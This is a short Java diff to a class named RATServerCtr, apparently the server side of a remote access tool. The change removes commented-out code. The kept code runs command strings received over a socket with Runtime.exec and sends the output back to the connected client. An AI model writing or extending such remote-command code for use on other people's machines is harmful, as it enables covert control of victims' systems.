@@ -92,9 +92,7 @@ public class RATServerCtr {
     
     public void sendError(String res) {
         try {
-//            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
             DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
-//            oos.writeObject(res);
             dout.writeUTF(res);
         } catch (Exception e) {
             e.printStackTrace();
@@ -104,23 +102,6 @@ public class RATServerCtr {
     public void commandHandler(String command) throws IOException {
         String c = command;
         try {
-//            //ArrayList<String> ar = new ArrayList<String>();
-//            //String line;
-//            Process proc = Runtime.getRuntime().exec(c);
-//            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-//            sendCommandRes("hello");
-//            while((line = input.readLine()) != null) {
-//                ar.add(line);   
-//            }
-//            //System.out.println(Arrays.toString(line.split("\s+"))); 
-//            input.close();
-//            sendCommandResLenght(ar.size());
-//            for(int i = 0; i < ar.size(); i++) {
-//                sendCommandRes(ar.get(i));
-//            }
-
-//ArrayList<String> ar = new ArrayList<String>();
-            //String line;
             Process proc = Runtime.getRuntime().exec(c);
             BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
             BufferedReader error = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
@@ -133,7 +114,7 @@ public class RATServerCtr {
                 while((line = input.readLine()) != null) {
                     lines.add(line);   
                 }
-                //System.out.println(Arrays.toString(line.split("\s+"))); 
+      
                 DataOutputStream dout = new DataOutputStream(s.getOutputStream());
 
                 dout.writeInt(lines.size());
